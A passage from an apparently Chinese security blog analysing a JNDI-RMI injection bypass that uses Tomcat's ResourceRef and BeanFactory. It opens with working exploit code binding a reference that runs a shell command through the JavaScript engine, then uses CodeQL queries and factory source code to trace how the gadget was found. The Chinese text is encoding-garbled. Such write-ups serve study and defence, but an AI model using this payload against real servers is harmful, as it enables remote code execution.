å¼ºåˆ¶å°† &#x27;x&#x27; å±æ€§çš„setter ä» &#x27;setX&#x27; å˜ä¸º &#x27;eval&#x27;, è¯¦ç»†é€»è¾‘è§ BeanFactory.getObjectInstance ä»£ç </span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"><span class="comment">// åˆ©ç”¨è¡¨è¾¾å¼æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;open -a calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure><h2 id="æ€è·¯é€†å‘åˆ†æ"><a href="#æ€è·¯é€†å‘åˆ†æ" class="headerlink" title="æ€è·¯é€†å‘åˆ†æ"></a>æ€è·¯é€†å‘åˆ†æ</h2><p>çŸ¥å…¶ç„¶æ›´è¦çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œè¿™ç§ç»•è¿‡æ–¹å¼ä½†æ˜¯å¦‚ä½•å‘ç°çš„å‘¢ï¼Ÿ</p><h3 id="ResourceRef-çš„å®šä½"><a href="#ResourceRef-çš„å®šä½" class="headerlink" title="ResourceRef çš„å®šä½"></a>ResourceRef çš„å®šä½</h3><p>ä»RegistryContext#decodeObject é™åˆ¶é€»è¾‘ä¸­å¯ä»¥çœ‹åˆ°ï¼Œjava.naming.Reference ç”¨ä¸äº†ï¼Œå› ä¸ºgetFactoryClassLocation è¿‡ä¸äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œè¿˜æœ‰å“ªäº›ç±»æ»¡è¶³</p><ol><li>ç»§æ‰¿Reference</li><li>getFactoryClassLocation å¯ä»¥ä¸ºnull</li></ol><p>å°è¯•æ‰¾ç»§æ‰¿Reference çš„å­ç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class MyReference extends ClassOrInterface&#123;</span><br><span class="line">MyReference()&#123;</span><br><span class="line">this.getName()&#x3D;&quot;Reference&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate isMyClass(Class m)&#123;</span><br><span class="line">m.getASupertype*() instanceof MyReference</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where isMyClass(c)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p>ç»“è®ºæ˜¯åœ¨tomcat-catalina ä¸­æ‰¾åˆ°äº†</p><ul><li><strong>org.apache.naming.ResourceRef</strong></li><li>org.apache.naming.LookupRef (å¯rmiè½¬ldapï¼Œä½œç”¨æœ‰é™)</li><li>org.apache.naming.HandlerRef</li><li>org.apache.naming.EjbRef</li><li>org.apache.naming.ResourceLinkRef</li><li>org.apache.naming.ResourceEnvRef</li><li>org.apache.naming.ServiceRef</li></ul><p>ä»¥ResourceRef ä¸ºä¾‹</p><h3 id="ReferenceWrapper-çš„å®šä½"><a href="#ReferenceWrapper-çš„å®šä½" class="headerlink" title="ReferenceWrapper çš„å®šä½"></a>ReferenceWrapper çš„å®šä½</h3><p>ResourceRef å®šä½åˆ°äº†ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥bind, å› ä¸ºjava.rmi.registry.Registry åªèƒ½bind Remoteç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(String name, Remote obj)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœç†Ÿæ‚‰JNDI-RMI ä½ç‰ˆæœ¬æ³¨å…¥ï¼Œåº”è¯¥è®°å¾—è¿™ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>ç›´æ¥bind Exploit</li><li><strong>é€šè¿‡ReferenceWrapper(reference) å®ç°bind è¿œç¨‹ç›®æ ‡ç±»</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1. ç›´æ¥ç»‘å®šå­˜åœ¨æ¶æ„ä»£ç å—çš„ç±»å®ä¾‹</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, (Remote) <span class="keyword">new</span> Exploit());</span><br><span class="line"></span><br><span class="line">#2. reference</span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://localhost:8000/&quot;</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>,referenceWrapper);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ReferenceWrapper(ResourceRef) å¯ä»¥å—ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ResourceRef ç»§æ‰¿Referenceï¼Œå¯ä»¥</p><h3 id="BeanFactory-çš„å®šä½"><a href="#BeanFactory-çš„å®šä½" class="headerlink" title="BeanFactory çš„å®šä½"></a>BeanFactory çš„å®šä½</h3><p>å†å›é¡¾ä¸‹javax.naming.spi.NamingManager#getObjectInstance çš„è¿‡ç¨‹</p><ol><li>ref = (Reference) refInfo;</li><li>String f = ref.getFactoryClassName();</li><li>factory = getObjectFactoryFromReference(ref, f);</li><li>return factory.getObjectInstance(ref, name, nameCtx,  environment);</li></ol><p>ç»“åˆResourceRef çš„æ„é€ å‡½æ•°ä»¥åŠfactoryå±æ€§<br><code>public ResourceRef(String resourceClass, String description, String scope, String auth, boolean singleton, String factory, String factoryLocation) &#123;</code></p><p>é‚£ä¹ˆé—®é¢˜å°±æˆäº†ï¼šå¯»æ‰¾å¯åˆ©ç”¨çš„Factoryï¼Œéœ€è¦æ»¡è¶³</p><ol><li>ç»§æ‰¿Factory</li><li>getObjectInstance æœ‰å¯åˆ©ç”¨ç©ºé—´<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class MyFactory extends ClassOrInterface&#123;</span><br><span class="line">MyFactory()&#123;</span><br><span class="line">this.getName()&#x3D;&quot;ObjectFactory&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate isMyClass( Class m)&#123;</span><br><span class="line">m.getASourceSupertype() instanceof MyFactory</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where isMyClass(c)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure>æ‰¾æ‰¾tomcatä¸‹é¢ç¬¦åˆçš„Factoryï¼š</li></ol><ul><li>org.apache.naming.factory.BeanFactory</li><li>org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory</li><li>org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory</li><li>org.apache.tomcat.jdbc.pool.DataSourceFactory</li></ul><h4 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h4><p>åˆ©ç”¨è¦æ±‚æ€»ç»“ï¼š</p><ol><li>éœ€è¦æœ‰æ— å‚æ„é€ å‡½æ•°</li><li>å¯ä»¥è°ƒç”¨ç¬¦åˆæ¡ä»¶çš„æ–¹æ³•ï¼Œè¦æ±‚æ–¹æ³•çš„å‚æ•°ä¸º1ä¸ªï¼Œç±»å‹ä¸ºString</li><li>è¿˜å¯ä»¥è°ƒç”¨set*æ–¹æ³•ï¼Œè¦æ±‚æ–¹æ³•çš„å‚æ•°ä¸º1ä¸ªï¼Œç±»å‹ä¸ºString</li><li>ä»¥ä¸Šæ–¹æ³•éƒ½è¦æ±‚public</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    String beanClassName = ref.getClassName();</span><br><span class="line">    ClassLoader tcl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="comment">// 1. åå°„è·å–ç±»å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanClass = Class.forName(beanClassName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. åˆå§‹åŒ–ç±»å®ä¾‹</span></span><br><span class="line">    Object bean = beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æ ¹æ® Reference çš„å±æ€§æŸ¥æ‰¾ setter æ–¹æ³•çš„åˆ«å</span></span><br><span class="line">    RefAddr ra = ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">    String value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å¾ªç¯è§£æåˆ«åå¹¶ä¿å­˜åˆ°å­—å…¸ä¸­</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line">        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. è§£ææ‰€æœ‰å±æ€§ï¼Œå¹¶æ ¹æ®åˆ«åå»è°ƒç”¨ setter æ–¹æ³•</span></span><br><span class="line">    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line">    <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        ra = e.nextElement();</span><br><span class="line">        String propName = ra.getType();</span><br><span class="line">        String value = (String)ra.getContent();</span><br><span class="line">        Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">        Method method = forced.get(propName);</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">            valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-dbcp-dbcp2-datasources-InstanceKeyDataSourceFactory"><a href="#org-apache-tomcat-dbcp-dbcp2-datasources-InstanceKeyDataSourceFactory" class="headerlink" title="org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory"></a>org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory</h4><p>åˆ©ç”¨è¦æ±‚æ€»ç»“ï¼š</p><ol><li>å¦‚æœæœ‰æœ¬åœ°Gadgetsï¼Œå¯ä»¥ååºåˆ—åŒ–ï¼Œé¸¡è‚‹</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(<span class="keyword">final</span> Object refObj, <span class="keyword">final</span> Name name, <span class="keyword">final</span> Context context,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">final</span> Hashtable&lt;?, ?&gt; env)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// The spec says to return null if we can&#x27;t create an instance</span></span><br><span class="line">    <span class="comment">// of the reference</span></span><br><span class="line">    Object obj = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refObj <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        <span class="keyword">final</span> Reference ref = (Reference) refObj;</span><br><span class="line">        <span class="keyword">if</span> (isCorrectClass(ref.getClassName())) &#123;</span><br><span class="line">            <span class="keyword">final</span> RefAddr refAddr = ref.get(<span class="string">&quot;instanceKey&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// object was bound to JNDI via Referenceable API.</span></span><br><span class="line">                obj = instanceMap.get(refAddr.getContent());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Tomcat JNDI creates a Reference out of server.xml</span></span><br><span class="line">                <span class="comment">// &lt;ResourceParam&gt; configuration and passes it to an</span></span><br><span class="line">                <span class="comment">// instance of the factory given in server.xml.</span></span><br><span class="line">                String key = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (name != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    key = name.toString();</span><br><span class="line">                    obj = instanceMap.get(key);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> InstanceKeyDataSource ds = getNewInstance(ref);</span><br><span class="line">                    setCommonProperties(ref, ds);</span><br><span class="line">                    obj = ds;</span><br><span class="line">                    <span class="keyword">if</span> (key != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        instanceMap.put(key, ds);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setCommonProperties</span><span class="params">(<span class="keyword">final</span> Reference ref, <span class="keyword">final</span> InstanceKeyDataSource ikds)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    RefAddr refAddr = ref.get(<span class="string">&quot;dataSourceName&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ikds.setDataSourceName(refAddr.getContent().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    refAddr = ref.get(<span class="string">&quot;description&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ikds.setDescription(refAddr.getContent().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    refAddr = ref.get(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized = (<span class="keyword">byte</span>[]) refAddr.getContent();</span><br><span class="line">        ikds.setJndiEnvironment((Properties) deserialize(serialized));</span><br><span class="line">    &#125;</span><br><span class="line">   ...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] data)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream in = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(data));</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException ex) &#123;</span><br><span class="line">                <span class="comment">// ignore</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-jdbc-naming-GenericNamingResourcesFactory"><a href="#org-apache-tomcat-jdbc-naming-GenericNamingResourcesFactory" class="headerlink" title="org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory"></a>org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory</h4><p>åˆ©ç”¨è¦æ±‚æ€»ç»“ï¼š</p><ol><li>éœ€è¦æœ‰æ— å‚æ„é€ å‡½æ•°</li><li>å¯ä»¥è°ƒç”¨set*æ–¹æ³•ï¼Œè¦æ±‚æ–¹æ³•çš„å‚æ•°ä¸º1ä¸ªï¼Œç±»å‹ä¸ºString/Int/Long/Boolean/InetAddress</li><li>ä»¥ä¸Šæ–¹æ³•éƒ½è¦æ±‚public<br>ä¸å¦‚BeanFactoryï¼Œé¸¡è‚‹</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((obj == <span class="keyword">null</span>) || !(obj <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    Enumeration&lt;RefAddr&gt; refs = ref.getAll();</span><br><span class="line">    String type = ref.getClassName();</span><br><span class="line">    Object o =</span><br><span class="line">        ClassLoaderUtil.loadClass(</span><br><span class="line">            type,</span><br><span class="line">            GenericNamingResourcesFactory.class.getClassLoader(),</span><br><span class="line">            Thread.currentThread().getContextClassLoader()).getConstructor().newInstance();</span><br><span class="line">    <span class="keyword">while</span> (refs.hasMoreElements()) &#123;</span><br><span class="line">        RefAddr addr = refs.nextElement();</span><br><span class="line">        String param = addr.getType();</span><br><span class="line">        String value = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr.getContent()!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            value = addr.getContent().toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setProperty(o, param, value)) &#123;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;Property not configured[&quot;</span>+param+<span class="string">&quot;]. No setter found on[&quot;</span>+o+<span class="string">&quot;].&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-jdbc-pool-DataSourceFactory"><a href="#org-apache-tomcat-jdbc-pool-DataSourceFactory" class="headerlink" title="org.apache.tomcat.jdbc.pool.DataSourceFactory"></a>org.apache.tomcat.jdbc.pool.DataSourceFactory</h4><p>åˆ©ç”¨è¦æ±‚æ€»ç»“ï¼š</p><ol><li>å¦‚æœåœ¨rmiæœ‰é™åˆ¶urlçš„æƒ…å†µï¼Œå¯ä»¥è½¬jndi-ldapè¿›è¡Œæ”»å‡»</li></ol><p>ä¸å¦‚BeanFactoryï¼Œé¸¡è‚‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// We only know how to deal with &lt;code&gt;javax.naming.Reference&lt;/code&gt;s</span></span><br><span class="line">    <span class="comment">// that specify a class name of &quot;javax.sql.DataSource&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ((obj == <span class="keyword">null</span>) || !(obj <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    <span class="keyword">boolean</span> XA = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> ok = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;javax.sql.DataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;javax.sql.XADataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">        XA = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (org.apache.tomcat.jdbc.pool.DataSource.class.getName().equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">        log.warn(ref.getClassName()+<span class="string">&quot; is not a valid class name/type for this JNDI factory.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ALL_PROPERTIES.length; i++) &#123;</span><br><span class="line">        String propertyName = ALL_PROPERTIES[i];</span><br><span class="line">        RefAddr ra = ref.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String propertyValue = ra.getContent().toString();</span><br><span class="line">            properties.setProperty(propertyName, propertyValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    